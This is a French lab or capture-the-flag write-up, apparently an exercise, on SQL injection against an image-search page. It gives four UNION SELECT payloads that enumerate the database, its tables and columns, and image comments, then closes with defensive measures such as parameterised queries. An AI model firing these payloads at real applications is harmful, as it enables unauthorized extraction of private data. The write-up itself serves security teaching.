# Exploit 02 - SQL Injection for search image page

## Objectif

L'objectif de cet exploit est de montrer comment une injection SQL peut être utilisée pour extraire des informations sensibles d'une base de données. Dans cet exemple, nous allons cibler une page de recherche d'image vulnérable à l'injection SQL.

## Exemple d'Exploitation

### Extraction de la Database

```sql 
1 UNION ALL SELECT 1, DATABASE();
```

### Extraction des Noms de Tables

```sql 
1 UNION ALL SELECT 1, GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE();
```

### Extraction des Noms de Toutes les Colonnes

```sql 
1 UNION ALL SELECT 1, GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = DATABASE();
```

### Extraction des Commentaires Spécifiques des Images

```sql
1 UNION ALL SELECT 1, GROUP_CONCAT(comment) FROM list_images;
```

### Hash de Mot de Passe
```bash
python3 get_flag.py
```

## Protection contre ce genre de cas

- **Utiliser des requêtes paramétrées** : Plutôt que de concaténer directement les entrées utilisateur dans les requêtes SQL, utilisez des requêtes paramétrées qui séparent clairement les données des instructions SQL.
  
- **Évaluer les entrées utilisateur** : Avant de les utiliser dans une requête SQL, évaluez toujours les entrées utilisateur pour s'assurer qu'elles correspondent au type attendu (par exemple, numérique, texte).
  
- **Mettre à jour régulièrement les logiciels** : Assurez-vous que tous les logiciels et bibliothèques utilisés dans le développement sont régulièrement mis à jour pour corriger les vulnérabilités connues.